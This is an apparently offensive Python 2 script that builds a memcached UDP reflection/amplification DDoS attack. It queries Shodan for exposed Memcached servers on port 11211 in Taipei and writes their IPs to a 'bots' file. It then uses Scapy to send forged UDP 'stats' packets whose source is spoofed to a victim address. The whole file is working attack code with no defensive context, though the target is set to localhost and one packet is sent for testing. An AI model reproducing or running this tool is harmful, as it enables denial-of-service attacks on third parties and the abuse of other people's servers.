import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager


api = shodan.Shodan("<edit your shodan key here>")
results = api.search('apache')

def collect_bots():
	try:  		
		#results = api.search('apache')#can be used by free api account
		results = api.search('product:"Memcached" port:11211 city:Taipei')
		#results = api.search('port:"7443" "server: Apache-Coyote/1.1" "Content-Length: 2721"')	
		print 'Results found: %s' % results['total']
		print('[?] API Key Authentication: SUCCESS')
		
		#for result in results['matches']:
			#print result['ip_str']
	except shodan.APIError, e:
		print 'Error: %s' % e

	#write to bots.txt
	print('[~] Number of bots: %s' % results['total'])			
	file2 = open('bots_taipei.txt', 'a')
	for result in results['matches']:
		file2.write(result['ip_str'] + "\n")
	print('[~] File written: ./bots_taipei.txt')
	print('')
	file2.close()	

def read_old_bots():
	myresults = Path("./bots_taipei.txt")
	if myresults.is_file():	
	  ip_arrayn = []
	  with open('bots_taipei.txt') as my_file:
			for line in my_file:
				ip_arrayn.append(line)
			ip_array = [s.rstrip() for s in ip_arrayn]	
			return ip_array
	else:
		print "no bots file found"	

bots=read_old_bots()
for result in bots:
	print result
target = '127.0.0.1' #str(input("[?] Enter target IP address: "))
power = 1 #int(input("[?] Enter preferred power (Default 1): ") or "1")
data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"	 #input("[?] Enter payload contained inside packet (or use default): ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"	

#send forged packets
for i in bots:
	print('[+] Sending %d forged UDP packets to: %s' % (power, i))
	#with suppress_stdout():
	send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
	break #send  1 for temperary for testing


